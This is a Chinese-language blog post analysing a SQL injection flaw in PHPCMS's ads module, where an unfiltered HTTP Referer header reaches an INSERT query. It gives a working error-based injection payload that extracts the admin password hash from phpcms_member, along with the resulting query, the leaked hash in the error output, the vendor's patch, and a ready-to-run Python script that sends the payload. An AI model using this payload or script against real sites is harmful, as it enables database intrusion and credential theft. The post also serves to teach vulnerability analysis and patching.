---
title: 一个SQL注入案例
date: 2016-05-24 19:39:11
categories: 安全
tags: [Web安全,SQL注入]
---

参考： http://www.ichunqiu.com/section/405  
在i春秋看到的，学习一下。  
<!--more-->
漏洞出现位置：

/ads/include/ads_place.class.php
function show中
```
function show($placeid)
{
  ...
  if($adses[0]['option'])
  {
    foreach($adses as $ads)
    {
      $contents[] = ads_content($ads, 1);
      $this->db->query("INSERT INTO $this->stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES ('$ads[adsid]', '$_username', '$ip', '$this->referer', '$time', '0')");
      $template = $ads['template'] ? $ads['template'] : 'ads';
    }
  }
  else
  {
    $ads = $this->db->get_one("SELECT * FROM ".DB_PRE."ads a, $this->table p WHERE a.placeid=p.placeid AND p.placeid=$placeid AND a.fromdate<=UNIX_TIMESTAMP() AND a.todate>=UNIX_TIMESTAMP() AND a.passed=1 AND a.status=1 ORDER BY rand() LIMIT 1");
    $contents[] = ads_content($ads, 1);
    $this->db->query("INSERT INTO $this->stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES ('$ads[adsid]', '$_username', '$ip', '$this->referer', '$time', '0')");
    $template = $ads['template'] ? $ads['template'] : 'ads';
  }
  include template('ads', $template);
}
在此处的数据插入处，未对$this->referer过滤。
```
```
$this->db->query("INSERT INTO $this->stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES ('$ads[adsid]', '$_username', '$ip', '$this->referer', '$time', '0')");
```
其中，` $this->referer = HTTP_REFERER`   
HTTP_REFERER定义为
`define('HTTP_REFERER', isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');`  
所以$this->referer就是http请求头中所带的referer字段。  


但是$this->referer无法直接由用户控制。
通过查找。在/ads/include/common.inc.php中包含了ads_place.class.php文件
```
require substr(MOD_ROOT, 0, -1-strlen($mod)).'include/common.inc.php';
require MOD_ROOT.'include/global.func.php';
require MOD_ROOT.'include/ads_place.class.php';
require MOD_ROOT.'include/ads.class.php';
```
继续查找，在/ads/ad.php中包含了common.inc.php文件。
```
require './include/common.inc.php';
```
继续，在data/js.php中，包含了ad.php
```
<?php
chdir('../ads/');
require './ad.php';
?>
```
所以只要向ad.php插入referer字段，就可以到达注入的目的。
playload
```
1',(select 1 from (select count(*),concat(floor(rand(0)*2),char(45,45,45),(select password from phpcms_member limit 1))a from information_schema.tables group by a)b),'0')#
```
结合起来就是

```
INSERT INTO $this->stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES ('$ads[adsid]', '$_username', '$ip', '1',(select 1 from (select count(*),concat(floor(rand(0)*2),char(45,45,45),(select password from phpcms_member limit 1))a from information_schema.tables group by a)b),'0')#', '$time', '0')
```
解释：
从最里面开始

(select password from phpcms_member limit 1)
结果：5c177f35077e9e0a4a5f7cb4dbc96937   
即phpcms管理员密码MD5

`select count(*),concat(floor(rand(0)*2),char(45,45,45),(select password from phpcms_member limit 1))a from information_schema.tables group by a`

`floor(rand(0)*2)`//生成随机数
concat//SQL CONCAT函数用于将两个字符串连接起来，形成一个单一的字符串。
char(45,45,45)将ASCII 码转换为字符。 即---
`concat(floor(rand(0)*2),char(45,45,45),5c177f35077e9e0a4a5f7cb4dbc96937)`
即1---5c177f35077e9e0a4a5f7cb4dbc96937
`count(*)//COUNT(*)` 函数返回表中的记录数
关于报错注入的原理，参考
["Mysql报错注入原理分析(count()、rand()、group by)"](http://drops.wooyun.org/tips/14312
)
简单的来说，查询过程中，会建立虚表，`floor(rand(0)*2)`会被执行多次，导致插入主键重复而出错。

查询语句为：
```
 INSERT INTO phpcms_ads_1605 (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES ('', '', '222.182.99.248', '1',(select 1 from (select count(*),concat(floor(rand(0)*2),char(45,45,45),(select password from phpcms_member limit 1))a from information_schema.tables group by a)b),'0')#', '1462786486', '0')
```
报错结果:
MySQL Error : Duplicate entry '1---5c177f35077e9e0a4a5f7cb4dbc96937' for key 'group_key'

官方补丁：
```
//对数据进行过滤
  $referer = safe_replace($this->referer);
```
附个脚本
```
import requests
url = 'http://xxx.com/ads/ad.php?id=1'
playload = "1',(select 1 from (select count(*),concat(floor(rand(0)*2),char(45,45,45),(select password from phpcms_member limit 1))a from information_schema.tables group by a)b),'0')#"
header = {'Referer': playload, }
result = requests.get(url, headers=header)
print(result.text)
```
